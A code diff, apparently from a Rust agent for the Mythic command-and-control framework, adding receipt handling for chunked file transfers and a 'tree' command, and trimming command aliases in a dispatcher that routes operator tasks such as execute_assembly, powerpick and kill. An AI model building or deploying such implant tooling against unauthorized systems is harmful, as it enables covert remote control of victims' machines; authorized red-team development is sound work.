@@ -46,6 +46,33 @@ mod wget;
 mod whoami;
 
 use mythic::{TaskMessage, TaskResponse};
+use serde::Deserialize;
+use uuid::Uuid;
+
+#[derive(Debug, Clone, Deserialize, Default)]
+pub struct PostResponseReceipt {
+    pub task_id: Uuid,
+    #[serde(default)]
+    pub status: String,
+    #[serde(default)]
+    pub file_id: Option<Uuid>,
+    #[serde(default)]
+    pub error: Option<String>,
+    #[serde(default)]
+    pub chunk_num: Option<u32>,
+    #[serde(default)]
+    pub total_chunks: Option<u32>,
+    #[serde(default)]
+    pub chunk_data: Option<String>,
+}
+
+pub fn responses_from_post_response_receipts(
+    receipts: &[PostResponseReceipt],
+) -> Vec<TaskResponse> {
+    let mut out = download::responses_from_receipts(receipts);
+    out.extend(upload::responses_from_receipts(receipts));
+    out
+}
 
 /// Route any command to its handler.
 pub fn dispatch(task: &TaskMessage) -> TaskResponse {
@@ -56,14 +83,15 @@ pub fn dispatch(task: &TaskMessage) -> TaskResponse {
         "download" => download::handle(task),
         "env" => env::handle(task),
         "execute" => process::handle_execute(task),
-        "execute_assembly" | "executeAssembly" => execute_assembly::handle(task),
+        "execute_assembly" => execute_assembly::handle(task),
         "exit" => exit::handle(task),
         "kill" => kill::handle(task),
         "ls" => ls::handle(task),
+        "tree" => ls::handle_tree(task),
         "mkdir" => mkdir::handle(task),
         "mv" => mv::handle(task),
         "netstat" => netstat::handle(task),
-        "powerpick" | "PowerPick" => powerpick::handle(task),
+        "powerpick" => powerpick::handle(task),
         "ps" => ps::handle(task),
         "pwd" => pwd::handle(task),
         "resolve" => resolve::handle(task),
